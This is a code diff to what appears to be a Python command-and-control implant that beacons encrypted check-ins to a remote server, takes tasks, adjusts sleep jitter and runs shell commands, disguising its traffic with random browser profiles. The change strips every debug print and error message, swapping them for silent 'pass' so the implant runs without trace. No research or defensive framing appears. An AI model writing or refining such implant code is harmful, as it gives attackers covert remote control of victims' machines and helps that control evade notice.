@@ -41,8 +41,6 @@ try:
 except Exception as e:
     AGENT_ID = str(uuid.uuid4())[:8]
 
-print(f"Agent ID: {AGENT_ID}")
-
 
 def get_session():
     profile = random.choice(BROWSER_PROFILES)
@@ -110,11 +108,8 @@ def beacon():
             }
             payload = {"id": AGENT_ID}
             plain_json = json.dumps(payload)
-            print("[DEBUG agent] Sending plain JSON:", plain_json)
 
             encrypted_payload = encrypt_data(json.dumps(payload))
-            print("[DEBUG agent] Encrypted token:", encrypted_payload[:150], "...")
-            print("[DEBUG agent] Token Length:", len(encrypted_payload))
 
             try:
                 response = session.post(f"{SERVER}{BEACON_ENDPOINT}",
@@ -133,15 +128,12 @@ def beacon():
                     return
 
             except Exception as e:
-                print(f"[!] Beacon error: {e}")
-                print("[DEBUG agent] Cannot Sending - ERROR:", str(e))
+                pass
         except Exception as e:
-            print(f"[!] Beacon error: (attempt {attempt}/{max_attempts}): {e}")
+            pass
         if attempt < max_attempts:
             sleep_time = (backoff_factor ** (attempt - 1)) + random.uniform(0.5, 2.0)
-            print(f"Waiting for retry: {sleep_time:.2f} ...")
             time.sleep(sleep_time)
-    print("[!] Beacon failed after all retries")
 
 def execute_task(task, session):
     task_type = task.get('type')
@@ -162,9 +154,8 @@ def execute_task(task, session):
         global SLEEP_MIN, SLEEP_MAX
         SLEEP_MIN = task.get("min", SLEEP_MIN)
         SLEEP_MAX = task.get("max", SLEEP_MAX)
-        print(f"[*] Sleep adjusted: {SLEEP_MIN}-{SLEEP_MAX}s")
     else:
-        print(f"[!] Unknown task type : {task_type}")
+        pass
 
 
 
@@ -202,14 +193,13 @@ def post_result(result, session):
             if response.status_code in (200, 201, 204):
                 return
             else:
-                print(f"Post result HTTP {session.status_code} (attempt {attempt})")
+                pass
         except:
             pass
 
     if attempt < max_attempts:
         sleep_time = (backoff_factor ** (attempt - 1)) + random.uniform(0.5, 2.0)
         time.sleep(sleep_time)
-print("[!] Post result failed after all retries")
 
 def run_shell_command(command, session):
     try:
